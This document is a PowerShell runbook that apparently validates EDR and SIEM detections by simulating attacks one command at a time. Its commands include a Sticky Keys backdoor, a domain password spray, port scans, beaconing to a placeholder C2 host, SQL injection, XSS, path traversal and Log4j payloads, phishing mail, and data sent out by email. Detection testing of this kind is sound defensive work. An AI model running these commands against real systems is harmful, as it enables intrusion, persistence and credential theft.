# TDA Manual Runbook — Line by Line (No Downloads)

Windows machine, **admin rights**, Halcyon blocks downloads → built-in tools only.
Open **PowerShell as Administrator** and run commands **one at a time, in order**.
If Halcyon/EDR **blocks** an action = that's a detection (screenshot = PASS).

## Setup (run once)

**Command 1**
```powershell
auditpol /set /subcategory:"Process Creation" /success:enable
```
Turns on Windows process-creation logging (Event 4688) so the SIEM can see the tests.

**Command 2**
```powershell
whoami /groups | findstr /i "S-1-16-12288"
```
Confirms you're running as admin (a line returned = elevated).

---

# UC0032 — Critical Malware Detected on EDR

**Command 1**
```powershell
$e = 'X5O!P%@AP[4' + '\PZX54(P^)7CC)7}' + '$EICAR-STANDARD-' + 'ANTIVIRUS-TEST-FILE!$H+H*'
```
Builds the harmless EICAR test string that every AV must detect as malware.

**Command 2**
```powershell
Set-Content -Path "$env:TEMP\eicar.com" -Value $e -Encoding Ascii
```
Writes the EICAR string to a file on disk (this is what triggers the AV/EDR).

**Command 3**
```powershell
Get-Content "$env:TEMP\eicar.com"
```
Reads the file to force the scanner to inspect it.

**Command 4 — cleanup**
```powershell
Remove-Item "$env:TEMP\eicar.com" -Force -ErrorAction SilentlyContinue
```
Deletes the test file.

---

# UC0149 — Multiple AV Infections on Same Host

**Command 1**
```powershell
$e = 'X5O!P%@AP[4' + '\PZX54(P^)7CC)7}' + '$EICAR-STANDARD-' + 'ANTIVIRUS-TEST-FILE!$H+H*'
```
Builds the EICAR test string.

**Command 2**
```powershell
1..5 | ForEach-Object { Set-Content "$env:TEMP\eicar_$_.com" -Value $e -Encoding Ascii }
```
Creates 5 EICAR files so the AV logs multiple detections on one host.

**Command 3**
```powershell
Get-ChildItem "$env:TEMP\eicar_*.com" | ForEach-Object { Get-Content $_.FullName | Out-Null }
```
Reads all 5 files to trigger scanning of each.

**Command 4 — cleanup**
```powershell
Remove-Item "$env:TEMP\eicar_*.com" -Force
```
Deletes the 5 test files.

---

# UC0125 — Common Ransomware Extensions Detected

**Command 1**
```powershell
$dir="$env:TEMP\ransom"; New-Item -ItemType Directory -Force $dir | Out-Null
```
Makes a test folder in Windows temp.

**Command 2**
```powershell
$ext=".locky",".crypt",".encrypted",".wncry",".cerber",".zepto",".crypto",".enc"
```
Saves a list of known ransomware extensions.

**Command 3**
```powershell
1..20 | ForEach-Object { $f="$dir\doc$_.txt"; "data" | Set-Content $f; Rename-Item $f "$dir\doc$_$($ext[$_ % $ext.Count])" }
```
Creates 20 files and renames them with ransomware extensions (simulates encryption).

**Command 4**
```powershell
"Your files are encrypted. Pay to recover." | Set-Content "$dir\READ_ME_DECRYPT.txt"
```
Drops a fake ransom note.

**Command 5 — cleanup**
```powershell
Remove-Item "$env:TEMP\ransom" -Recurse -Force
```
Deletes the whole test folder.

---

# UC0036 — APT Group Process Creation (Masquerading)

**Command 1**
```powershell
Copy-Item C:\Windows\System32\cmd.exe C:\Windows\Temp\lsass.exe
```
Copies cmd.exe and renames it to `lsass.exe` in the wrong folder (masquerade).

**Command 2**
```powershell
Start-Process C:\Windows\Temp\lsass.exe
```
Runs the fake `lsass.exe`.

**Command 3**
```powershell
Get-Process lsass | Select-Object Id,Path,StartTime
```
Shows the running lsass processes — the fake one has path `C:\Windows\Temp`.

**Command 4 — cleanup**
```powershell
Stop-Process -Name lsass -Force -ErrorAction SilentlyContinue; Remove-Item C:\Windows\Temp\lsass.exe -Force -ErrorAction SilentlyContinue
```
Kills the fake process and deletes the file. (Never touches the real System32 lsass.)

---

# UC0182 — Application Parents Spawning Malicious Children

**Command 1**
```powershell
Set-Content "$env:TEMP\uc0182.vbs" 'CreateObject("WScript.Shell").Run "cmd.exe /c whoami > %TEMP%\uc0182.txt"'
```
Creates a small VBScript that will launch cmd.exe.

**Command 2**
```powershell
wscript.exe "$env:TEMP\uc0182.vbs"
```
Runs the script via Windows Script Host — `wscript.exe` spawns `cmd.exe` (the anomaly).

**Command 3**
```powershell
Get-Content "$env:TEMP\uc0182.txt"
```
Confirms the child cmd ran (prints your username).

**Command 4 — cleanup**
```powershell
Remove-Item "$env:TEMP\uc0182.*" -Force
```
Deletes the script and output file.

---

# UC0185 — Abuse of Accessibility Binaries (Sticky Keys / Shift ×5)

**Command 1**
```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
```
Sets cmd.exe as the "debugger" for Sticky Keys — pressing Shift ×5 at login would open a SYSTEM shell.

**Command 2 — cleanup**
```powershell
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f
```
Removes the backdoor registry key.

---

# SPLUC0187 — Scheduled Task Calling Malicious Child Process

**Command 1**
```powershell
schtasks /create /tn "uc0187test" /tr "cmd.exe /c whoami > %TEMP%\uc0187.txt" /sc once /st 23:59 /f
```
Creates a scheduled task that runs cmd.exe.

**Command 2**
```powershell
schtasks /run /tn "uc0187test"
```
Runs the task now — the Task Scheduler spawns cmd.exe (the detection).

**Command 3 — cleanup**
```powershell
schtasks /delete /tn "uc0187test" /f
```
Deletes the task.

---

# UC0043 — Threat Activity Detected (recon burst)

**Command 1**
```powershell
whoami /all; net user; net group "domain admins" /domain; systeminfo; tasklist; nltest /domain_trusts
```
Runs several attacker-style discovery commands quickly (recon burst the rule flags).

---

# UC0053 — Horizontal Port Scan (one port, many hosts)

**Command 1**
```powershell
$port=445
```
Sets the single port to scan across all hosts.

**Command 2**
```powershell
"172.16.75","172.16.5" | ForEach-Object { $s=$_; 1..254 | ForEach-Object { $ip="$s.$_"; $t=New-Object System.Net.Sockets.TcpClient; $c=$t.BeginConnect($ip,$port,$null,$null); if($c.AsyncWaitHandle.WaitOne(120)){"$ip:$port OPEN"; try{$t.EndConnect($c)}catch{}}; $t.Close() } }
```
Connects to port 445 on every host in the two subnets (the horizontal scan).

---

# UC0054 — Vertical Port Scan (many ports, one host)

**Command 1**
```powershell
$ip="<TARGET>"
```
Sets the single target to scan.

**Command 2**
```powershell
1..1024 | ForEach-Object { $p=$_; $t=New-Object System.Net.Sockets.TcpClient; $c=$t.BeginConnect($ip,$p,$null,$null); if($c.AsyncWaitHandle.WaitOne(120)){"$ip:$p OPEN"; try{$t.EndConnect($c)}catch{}}; $t.Close() }
```
Connects to ports 1–1024 on that one host (the vertical scan).

---

# UC0249 — Prohibited Port Activity Detected

**Command 1**
```powershell
$ip="<TARGET>"
```
Sets the target.

**Command 2**
```powershell
23,6667,4444 | ForEach-Object { $p=$_; $r=Test-NetConnection $ip -Port $p -WarningAction SilentlyContinue; "$ip:$p -> $($r.TcpTestSucceeded)" }
```
Attempts connections to forbidden ports (telnet 23, IRC 6667, 4444).

---

# UC0141 — C2 / Command-and-Control Traffic

**Command 1**
```powershell
$c2="http://<LAB_C2_HOST>/beacon"
```
Sets the lab-controlled beacon URL (never real malicious infrastructure).

**Command 2**
```powershell
1..30 | ForEach-Object { try { Invoke-WebRequest $c2 -UseBasicParsing -TimeoutSec 5 -Headers @{ "User-Agent"="Mozilla/5.0 (compatible; beacon)" } | Out-Null } catch {}; Start-Sleep -Seconds 10 }
```
Sends a small request every 10 seconds, 30 times — the regular beacon pattern C2 detections flag.

---

# UC0046 — Password Spray Detected

**Command 1**
```powershell
(net user /domain) | Out-File "$env:TEMP\users.txt"
```
Saves the domain user list to a file.

**Command 2**
```powershell
$users = Get-Content "$env:TEMP\users.txt" | Where-Object { $_ -match '^\S' }
```
Loads the user list into a variable.

**Command 3**
```powershell
$pw = "Winter2026!"
```
Sets the one password to spray (use an agreed one to avoid lockouts).

**Command 4**
```powershell
foreach ($u in $users) { cmd /c "net use \\<DC>\IPC$ /user:$u $pw" 2>$null; Start-Sleep -Milliseconds 300 }
```
Tries that one password against every account (the spray).

---

# UC0228 — SQL Injection Attempt

**Command 1**
```powershell
$u="http://<WEBAPP>"
```
Sets the target web app URL.

**Command 2**
```powershell
"1' OR '1'='1","1; DROP TABLE users--","' UNION SELECT null,username,password FROM users--" | ForEach-Object { $p=[uri]::EscapeDataString($_); try { Invoke-WebRequest "$u/product?id=$p" -UseBasicParsing -TimeoutSec 5 | Out-Null } catch {} }
```
Sends SQL-injection patterns in the URL — the WAF/SIEM flags them.

---

# UC0229 — Web Application Exploit Detected

**Command 1**
```powershell
$u="http://<WEBAPP>"
```
Sets the target web app URL.

**Command 2**
```powershell
@("/search?q=<script>alert(1)</script>","/download?file=../../../../etc/passwd","/ping?host=127.0.0.1;whoami",'/api?x=${jndi:ldap://127.0.0.1/a}') | ForEach-Object { try { Invoke-WebRequest "$u$_" -UseBasicParsing -TimeoutSec 5 | Out-Null } catch {} }
```
Sends XSS, path-traversal, command-injection and Log4j exploit patterns.

---

# UC0222 — Suspicious Email Attachment / Malware by Mail
**Needs:** an SMTP relay + a target mailbox.

**Command 1**
```powershell
Copy-Item C:\Windows\System32\calc.exe "$env:TEMP\invoice.exe"
```
Makes a file with a risky `.exe` extension (using a built-in file, no download).

**Command 2**
```powershell
Send-MailMessage -From "tester@yourlab.local" -To "<victim@customer.com>" -Subject "Invoice attached" -Body "Please review." -Attachments "$env:TEMP\eicar.com","$env:TEMP\invoice.exe" -SmtpServer "<SMTP_SERVER>"
```
Emails the EICAR file + risky attachment into the org (tests mail AV + extension rules).

---

# SPLUC0107 — Suspected Phishing Email
**Needs:** an SMTP relay + a monitored mailbox.

**Command 1**
```powershell
Send-MailMessage -From "security-alert@micros0ft-support.com" -To "<victim@customer.com>" -Subject "URGENT: Your account will be suspended" -Body "Verify now: http://<LAB_PHISH_HOST>/login" -SmtpServer "<SMTP_SERVER>"
```
Sends a phishing-style email (lookalike sender, urgency, suspicious link).

---

# UC0575 — Multiple DLP Violations for a User
**Needs:** a DLP solution watching a channel (email/upload/USB).

**Command 1**
```powershell
$dir="$env:TEMP\dlp"; New-Item -ItemType Directory -Force $dir | Out-Null
```
Makes a test folder.

**Command 2**
```powershell
1..5 | ForEach-Object { "Credit Card: 4111 1111 1111 1111`nSSN: 123-45-6789`nIBAN: GB82 WEST 1234 5698 7654 32" | Set-Content "$dir\sensitive_$_.txt" }
```
Creates 5 files with fake sensitive data (test PII).

**Command 3**
```powershell
Get-ChildItem $dir | ForEach-Object { Send-MailMessage -From "<you>" -To "<external@test.com>" -Subject "data" -Attachments $_.FullName -SmtpServer "<SMTP_SERVER>" }
```
Emails each file out to trigger multiple DLP violations for your user.

---

# Cloud (Azure / M365) — do in the BROWSER, no download
**Needs:** an Azure/M365 test account.

## UC0458 — Azure Activity CRUD
Portal `https://portal.azure.com` → Resource groups → **Create** `tda-test-rg` → add a **tag** → **Delete** it. Validates create/update/delete in Activity Log.

## UC0215 — Explicit MFA Deny
`https://portal.office.com` → sign in as test user → at the MFA push tap **Deny**. Validates MFA-denied in Entra sign-in logs.

## UC0327 — Privileged Access Outside PIM
Entra portal → Roles → assign **User Access Administrator** to the test user **permanently** (not via PIM), then do an admin action.

## Password Spraying M365
Browser → `https://login.microsoftonline.com` → try one password across a few agreed test accounts.

## Malicious MFA Takeover
Spam sign-in push prompts (MFA fatigue), or `https://aka.ms/mfasetup` → add a new MFA method to the test account.

## Abusing Virtual Machines
Portal → the VM → **Run command** → **RunPowerShellScript** → `whoami; hostname` → Run.

---

# UC0110 — Privilege Change on Firewall
**Done on the firewall itself** (not this PC). Create/modify an admin account or role.
- Palo Alto: `set mgt-config users tdatest permissions role-based superuser yes` → `commit`
- Fortinet: `config system admin` → `edit tdatest` → `set accprofile super_admin` → `end`

---

## Per test
Note UTC time + host/IP → announce to SOC → run the commands → if Halcyon blocks it, screenshot (= PASS) → check the SIEM alert → clean up.
